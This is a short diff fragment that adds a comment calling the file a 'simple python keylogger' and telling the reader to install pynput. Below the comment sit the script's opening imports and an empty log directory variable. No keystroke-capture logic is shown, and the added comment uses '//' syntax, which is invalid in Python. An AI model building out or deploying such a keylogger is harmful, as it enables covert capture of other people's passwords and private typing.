@@ -1,3 +1,5 @@
+//this is simple python keylogger//install the pynput module before using it//
+
 from pynput.keyboard import Key, Listener
 import logging
 log_dir = ""
